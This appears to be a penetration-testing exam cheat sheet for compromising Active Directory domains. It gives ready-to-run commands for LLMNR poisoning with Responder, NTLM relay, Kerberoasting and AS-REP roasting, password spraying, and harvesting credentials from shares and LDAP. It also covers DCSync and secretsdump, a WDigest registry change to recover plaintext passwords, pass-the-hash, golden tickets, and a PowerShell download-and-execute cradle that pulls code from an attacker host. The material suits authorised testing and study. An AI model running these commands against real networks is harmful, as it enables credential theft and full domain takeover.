# 03 — Active Directory

**Jump to:** [Pick your tool lane (read first)](#pick-your-tool-lane-read-first) · [Zero-cred enum — remote from Kali (do all of these first)](#zero-cred-enum--remote-from-kali-do-all-of-these-first) · [Zero-cred but you have a Windows foothold → PowerView (on-host)](#zero-cred-but-you-have-a-windows-foothold--powerview-on-host) · [When you have one credential (remote lane)](#when-you-have-one-credential-remote-lane) · [Common share loot (do this immediately after mounting anything)](#common-share-loot-do-this-immediately-after-mounting-anything) · [Attack list (tick as you rule each out)](#attack-list-tick-as-you-rule-each-out) · [Lateral movement (post first-machine access)](#lateral-movement-post-first-machine-access) · [Post-DA](#post-da) · [Reminders that catch people out](#reminders-that-catch-people-out)

Trigger: ports 88 (Kerberos), 389/636 (LDAP), 445 (SMB), or 464 (kpasswd) on any host.
Reference: [AD Enumeration](../1-information-gathering/06-active-directory-enumeration.md) · [AD Initial Access](../3-exploitation/05-ad-initial-access.md) · [AD Overview](../5-lateral-movement/01-active-directory-overview.md) · [Kerberos Attacks](../5-lateral-movement/03-kerberos-attacks.md).

## Pick your tool lane (read first)

Where you're standing decides the toolset. Don't mix lanes — it's the #1 time-sink.

| Your position | Lane | Default tools |
|---|---|---|
| On Kali, **have creds/hash** + reach to the DC | **Remote** | `nxc`, `impacket-*`, `bloodhound-python`, `ldapsearch` |
| **Shell on a domain-joined Windows host, NO domain creds** | **On-host** | **PowerView** (runs in the logged-on user's context — no creds to supply) |
| On Kali, **no creds at all** | **Zero-cred** | Responder, null/guest/RID, `kerbrute userenum` |

Rule of thumb: **no creds but a Windows foothold → PowerView.** Everything else → the remote lane below. DCSync is always `impacket-secretsdump` once you have the rights, regardless of lane.

---

## Zero-cred enum — remote from Kali (do all of these first)

- [ ] **Start Responder in a dedicated terminal the moment you land internal** — this is the highest-ROI passive attack in AD, run it while everything else happens:
  - Analyze-only first (no poisoning, just listen): `sudo responder -I tun0 -A`.
  - Full poisoning: `sudo responder -I tun0 -wF` (`-w` WPAD, `-F` force NTLM auth).
  - Captured hashes land at `/usr/share/responder/logs/*NTLMv2*.txt` — crack with `hashcat -m 5600 hash /usr/share/wordlists/rockyou.txt`.
  - If SMB signing is off on any host, pivot to relaying instead of cracking: turn off Responder's SMB/HTTP servers (`/etc/responder/Responder.conf` → `SMB=Off`, `HTTP=Off`) and run `impacket-ntlmrelayx -tf smb_signing_off.txt -smb2support -socks` in parallel.
  - `sudo responder -I tun0 -P -v` (`-P` proxy auth capture) also grabs WPAD proxy creds if the client uses PAC files.
- [ ] Confirm DC + domain name: `nxc smb <dc-ip>`.
- [ ] Add to `/etc/hosts`: `<dc-ip> dc01.domain.local domain.local`.
- [ ] SMB null session: `nxc smb <dc-ip> -u '' -p '' --shares --users --groups --pass-pol`.
- [ ] Guest session: `nxc smb <dc-ip> -u guest -p ''`.
- [ ] LDAP anonymous bind: `ldapsearch -x -H ldap://<dc-ip> -b "DC=domain,DC=local"`.
- [ ] User enum via RID cycling: `nxc smb <dc-ip> -u guest -p '' --rid-brute 10000`.
- [ ] Kerberos user enum (works without creds): `kerbrute userenum -d <domain> --dc <dc-ip> users.txt`.
  - **Strip trailing whitespace from `users.txt` first** — a stray space after a name makes userenum silently skip it: `sed -i 's/[[:space:]]*$//' users.txt`.
- [ ] AS-REP roast anyone unregistered for pre-auth: `impacket-GetNPUsers <domain>/ -usersfile users.txt -dc-ip <dc-ip> -no-pass -format hashcat`.
- [ ] **Username == password check** — cheap and hits constantly: `nxc smb <dc-ip> -u users.txt -p users.txt --no-brute --continue-on-success`.

## Zero-cred but you have a Windows foothold → PowerView (on-host)

You landed a shell (web shell → reverse shell, often as the **machine account**) but have no domain creds to auth from Kali. PowerView runs in your current context — no creds needed. Reference: [AD Enumeration → PowerView](../1-information-gathering/06-active-directory-enumeration.md).

- [ ] Load it: `Import-Module .\PowerView.ps1` (or `IEX(New-Object Net.WebClient).DownloadString('http://<kali>/PowerView.ps1')`).
- [ ] Orient: `Get-Domain`; `Get-DomainController`; `Get-DomainPolicy` (password/lockout policy before you spray).
- [ ] Map the second NIC — foothold hosts are often dual-homed: `route print`, then sweep with `1..254 | % { Test-Connection -Count 1 -Quiet 172.16.x.$_ }` (fping substitute).
- [ ] Users / groups / computers: `Get-DomainUser | select samaccountname,description`; `Get-DomainGroupMember "Domain Admins"`; `Get-DomainComputer | select dnshostname,operatingsystem`.
- [ ] **Kerberoast on-host (no creds):** `Get-DomainUser * -spn | select samaccountname`, then `Get-DomainSPNTicket -Format Hashcat <user>` → crack `hashcat -m 13100`.
- [ ] **Read ACLs on-host** (impacket can't do this): `Find-InterestingDomainAcl -ResolveGUIDs`, or targeted `Get-DomainObjectACL -Identity "Domain Admins" | ? {$_.ActiveDirectoryRights -match 'GenericAll|GenericWrite|WriteDACL|WriteOwner'}`; resolve with `ConvertFrom-SID <SID>`.
  - `DS-Replication-Get-Changes` (+ `-All`) rights on the domain object = **DCSync** — jump to Post-DA.
- [ ] Shares / trusts: `Find-DomainShare -CheckShareAccess`; `Get-DomainTrust`.
- [ ] Once you crack/loot ANY cred here → switch to the remote lane and spray it from Kali.

## When you have one credential (remote lane)

- [ ] **Spray it everywhere**: `nxc smb hosts.txt -u <user> -p <pass> --continue-on-success`, then repeat with `-winrm`, `-mssql`, `-ldap`, `-ssh`, `-ftp`.
  - **Repeat this for *every* new account you obtain, not just the first** — a cred that was worthless on one host is often admin on another, and each one can unlock users/shares the last couldn't see.
- [ ] SMB shares readable? `nxc smb <ip> -u <user> -p <pass> --shares`, then `smbclient //<ip>/<share> -U '<user>%<pass>'`.
- [ ] **Mount instead of interactive smbclient** — `sudo mount -t cifs //<ip>/<share> ./loot -o username=<user>,password=<pass>,vers=3.0` — tab-complete and grep like a real FS.
- [ ] **Auto-download every readable share**: `nxc smb <ip> -u <user> -p <pass> -M spider_plus -o DOWNLOAD_FLAG=true` → files land in `/root/.nxc/modules/nxc_spider_plus/<ip>/`.
- [ ] Dump SPNs (Kerberoast): `impacket-GetUserSPNs <domain>/<user>:<pass> -dc-ip <dc-ip> -request -outputfile spns.hash`.
- [ ] AS-REP roast with creds: `impacket-GetNPUsers <domain>/<user>:<pass> -request -dc-ip <dc-ip>`.
- [ ] Domain enum with bloodhound: `bloodhound-python -u <user> -p <pass> -d <domain> -ns <dc-ip> -c All`.
  - Import into BloodHound → run "Find Shortest Paths to Domain Admins" from your owned user.
  - **This is the remote way to read ACLs** — on a foothold with no creds, use PowerView `Find-InterestingDomainAcl` instead (see on-host section).
- [ ] LDAP dump: `ldapdomaindump -u <domain>\\<user> -p <pass> <dc-ip>`.
- [ ] **Check group membership without a shell** — `nxc ldap <dc-ip> -u <user> -p <pass> -M groupmembership -o USER=<user>` flags interesting groups (`Remote Management Users`, `Backup Operators`, custom admin groups) before you invest in a foothold.
- [ ] **Always pull LDAP with `"*"` to see every attribute** — default output hides the interesting ones: `ldapsearch -x -H ldap://<dc-ip> -D '<user>@<dom>' -w '<pass>' -b 'dc=<dom>,dc=<tld>' '(objectClass=user)' '*'`.
- [ ] Grep the full dump for creds in: `description`, `info`, `comment`, `notes`, `userPassword`, `unixUserPassword`, `unicodePwd`, `ms-Mcs-AdmPwd` (LAPS), `msDS-ManagedPassword` (gMSA), and any custom / non-standard attribute (`*legacyPwd`, `*helpdeskPwd`, etc. — non-stock schema is a red flag).
- [ ] `nxc ldap <dc-ip> -u <user> -p <pass> -M user-desc` for a quick description-only sweep.
- [ ] **AD Recycle Bin check** — if the user belongs to `AD Recycle Bin` (or has `Read Deleted Objects`), old privileged accounts often have their creds in `description`: `Get-ADObject -Filter 'isDeleted -eq $true' -IncludeDeletedObjects -Properties *`. From Linux: `ldapsearch ... -b 'CN=Deleted Objects,DC=<dom>,DC=<tld>' -E '!1.2.840.113556.1.4.417' '(objectClass=user)' '*'`.

## Common share loot (do this immediately after mounting anything)

- [ ] `SYSVOL\<domain>\Policies\` — old GPP `cpassword` (crack with `gpp-decrypt`).
- [ ] Any `.ps1`, `.bat`, `.vbs`, `.config` — grep for `password`, `pwd`, `secret`, `key`.
- [ ] Any `.kdbx` file (KeePass) → download → `keepass2john` → hashcat mode 13400.
- [ ] `unattend.xml`, `sysprep.xml`, `autounattend.xml` — plaintext admin creds.
- [ ] User profile shares — `.rdp` files with saved creds, browser profiles.
- [ ] **`.xlsx` / `.docx` / `.pptx` that won't open cleanly** — they're just ZIP files. `unzip file.xlsx -d out/`, then `grep -r 'pass\|user' out/`. Strings live in `xl/sharedStrings.xml`.
- [ ] **Custom admin binaries (`UserInfo.exe`, `LoginChecker.exe`, anything internal-looking)** — `strings -n 8 <file> | grep -iE 'pass|ldap|conn'`. If .NET: `ilspycmd <file> -o decompiled/` and grep for creds. Service accounts often called `ldap`, `svc_ldap`. **Also decompile every `.dll` in the same directory** — if the exe calls a function that isn't defined in its own decompile, the definition (crypto/decrypt routines especially) lives in a sibling DLL.
- [ ] **Encrypted blobs in local sqlite (`audit.db`, `app.db`, `settings.db`)** — dump with `sqlite3 <file> .dump`, find the decrypt routine in the app's DLLs, reproduce in CyberChef (AES/DES/RC4 recipes).
- [ ] **`.reg` files with `"Password"=hex:...`** — if it's VNC (RealVNC/TightVNC/UltraVNC), decrypt with `vncpwd`: `echo -n -e '\x6b\xcf\x...' > pass.bin && ./vncpwd pass.bin`.

## Attack list (tick as you rule each out)

- [ ] **AS-REP roast** — any user with `DONT_REQ_PREAUTH`. Hashcat mode 18200.
- [ ] **Kerberoast** — any user with a `servicePrincipalName`. Hashcat mode 13100.
- [ ] **Machine account quota** (MAQ ≥ 1) → RBCD attack. `impacket-addcomputer`.
- [ ] **ACL abuse** — check BloodHound edges outbound from your user: `GenericAll`, `WriteDACL`, `WriteOwner`, `ForceChangePassword`. Use `bloodyAD`. See [ACL Abuse](../5-lateral-movement/04-acl-abuse-bloodyad.md).
- [ ] **Unconstrained delegation** — hosts with `TRUSTED_FOR_DELEGATION`. Coerce DC → capture TGT.
- [ ] **Constrained delegation** — S4U2Self + S4U2Proxy dance.
- [ ] **Resource-based constrained delegation (RBCD)** — need `WriteProperty` on `msDS-AllowedToActOnBehalfOfOtherIdentity`. Before running `getST`: `unset KRB5CCNAME`, `sudo ntpdate <dc-ip>`, and confirm the target FQDN is in `/etc/hosts`. Use `sAMAccountName$` (with the `$`) as the RBCD target — not the FQDN. Ticket lands as whatever `ls *.ccache` returns.
- [ ] **PetitPotam / PrinterBug / DFSCoerce** — force auth from a host. Chain with unconstrained/ntlmrelay.
- [ ] **NTLM relay** — `ntlmrelayx -tf targets.txt -smb2support` while `responder -I tun0` runs.
- [ ] **ADCS** — ESC1 through ESC16. `certipy-ad find -u <user>@<domain> -p <pass> -dc-ip <dc-ip> -vulnerable -stdout`. Naming tell: any `ca_svc` / `cert_svc` / `pki_svc` account is the CA operator — if you can steal its NT hash (WriteOwner chain → `certipy-ad shadow auto`) you almost certainly have DA via ESC1 / ESC4. Full chain in [ACL Abuse → ADCS](../5-lateral-movement/04-acl-abuse-bloodyad.md).
- [ ] **noPac (CVE-2021-42278/42287)** — `impacket-noPac` if MAQ > 0 and DC unpatched.
- [ ] **Zerologon (CVE-2020-1472)** — only if the exam brief allows. Nukes the DC's password.
- [ ] **PrintNightmare (CVE-2021-34527)** — local privesc on any Windows host with spooler on.
- [ ] **SMB signing off?** → NTLM relay is on the table. `nxc smb hosts.txt --gen-relay-list relay.txt`.

## Lateral movement (post first-machine access)

- [ ] Dump SAM + LSA + DPAPI: `nxc smb <ip> -u <user> -p <pass> --sam --lsa --dpapi`.
- [ ] `secretsdump` on the box: `impacket-secretsdump <domain>/<user>:<pass>@<ip>`.
- [ ] **Mimikatz shows an NTLM hash but no cleartext?** Flip WDigest and force a re-logon to recover the plaintext (classic on older/2012 hosts): `reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f`, wait for the user to re-auth (or reboot), then re-run `sekurlsa::logonpasswords`. **Noisy + needs a re-logon — last resort when the hash won't crack and PtH is blocked.**
- [ ] Pass-the-hash across the estate: `nxc smb hosts.txt -u <user> -H <NT-hash> --continue-on-success`.
  - PtH over **RDP** fails under Restricted Admin mode — flip `DisableRestrictedAdmin` first. See [AD Initial Access](../3-exploitation/05-ad-initial-access.md).
- [ ] Pass-the-ticket if you have a `.ccache`: `export KRB5CCNAME=./ticket.ccache; nxc smb <ip> -k --use-kcache`.
- [ ] Silver ticket (service TGS) or golden ticket (KRBTGT hash) — see [Kerberos Attacks](../5-lateral-movement/03-kerberos-attacks.md).
- [ ] **Pick your exec method by artifact cost** — quiet → loud: `dcomexec` / `wmiexec` → `atexec` → `smbexec` → `psexec`. WinRM ≠ required; if SMB auth works, one of the five will land a shell. See [Windows Pivoting](../5-lateral-movement/05-windows-pivoting.md).
- [ ] RDP blocked to a DC? Fall back to WinRM: `evil-winrm -i <ip> -u <user> -p <pass>` or `Enter-PSSession -ComputerName <dc> -Credential <cred>`.

## Post-DA

- [ ] `secretsdump` on the DC: `impacket-secretsdump -just-dc <domain>/<user>:<pass>@<dc-ip>`.
- [ ] Targeted single-user DCSync (quieter): `impacket-secretsdump -just-dc-user krbtgt <domain>/<user>:<pass>@<dc-ip>`.
- [ ] Grab `krbtgt` hash → golden ticket capability for long-term persistence (**use surgically — a golden ticket in the logs is a burn signal**).
- [ ] Dump every user hash → hashcat with rockyou + rules → additional creds for lateral reach.

## Reminders that catch people out

- Time skew kills Kerberos. `sudo ntpdate <dc-ip>` or `sudo rdate -n <dc-ip>` before any Kerberos attack.
- Domain FQDN must be in `/etc/hosts` — Kerberos hates raw IPs.
- `nxc` vs `crackmapexec` — `nxc` is the maintained fork. Same syntax.
- **Don't tunnel-vision Kerberoast/AS-REP.** They're the first thing everyone reaches for and are often dead ends — password spraying a cleaned user list is frequently the real path in.
- **Lane discipline:** if a command wants creds and you have none, you're in the wrong lane — get a foothold and use PowerView on-host, or crack a Responder hash first.
